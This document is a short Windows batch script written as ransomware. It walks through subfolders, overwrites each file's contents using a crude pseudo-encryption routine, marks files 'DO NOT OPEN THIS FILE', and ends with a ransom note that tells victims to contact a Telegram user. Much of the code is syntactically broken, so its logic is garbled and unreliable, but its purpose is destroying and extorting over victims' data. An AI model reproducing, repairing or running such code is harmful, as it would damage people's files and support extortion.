@echo off
setlocal EnableDelayedExpansion

:: Set your decryption password
set "password=mrdirweb33lizscriptkiddle"

:: Define a function to check if a file exists
:checkFile
    for /f "delims=" %%a in ('dir /b /a-d "%~1" 2^>nul') do set "file=%%a"
    if not defined file (
        echo File "%~1" not found.
        goto :eof
    )
    set "file=%~dpn1%file"
    if exist "%file%.bak" del "%file%.bak"
    set "content="
    for /f "delims=" %%a in (%~1%) do set "content=!content!!encryptLine! EOL"
    set "encryptLine=!!!DO NOT OPEN THIS FILE!!! EOL"
    set "content=!content:.=.bak EOL!encryptLine"
    echo %content% > %~1
    goto :eof

:: Define a function to encrypt a line
:encryptLine
    for /l %%a in (1,1,%2) do call :rndChar >> tmp.txt
    for /f "delims=" %%a in (tmp.txt) do set "password=!password!!%a!"
    setlocal EnableDelayedExpansion
    for %%a in (!password!) do (
        if "!%%a!" neq "" (
            set "key=!key!%%a"
        ) else (
            set "key=!key!!"
        )
    )
    set "key=!key:~0,32!"
    set "line=!line!"
    for %%a in (!line!) do (
        set "crypt=!"
        for %%b in (!key!) do (
            set /a "index = (index + %%b) % 256"
            set "crypt=!crypt!%%chr(index+65)"
        )
        set "line=!line:%%a!%crypt%"
    )
    echo !line! >> tmp.txt
    del tmp.txt
    endlocal
    set "line="
    goto :eof

:: Define a function to generate a random character
:rndChar
    set /a "rand=!random! % 95 + 33"
    echo %rand%
    goto :eof

:: Scan for files to encrypt
for /d %%d in (*) do (
    if "%%d" ne "." (
        if "%%d" ne ".." (
            cd "%%d"
            for /f "delims=" %%f in ('dir /b /a-d *.*) do (
                call :checkFile "%%f"
                cd ..
            )
            cd ..
        )
    )
)

:: Display the ransom note
echo All your files have been encrypted. To decrypt them, send your phone number to this telegramuser: @DW_DIRWEB .
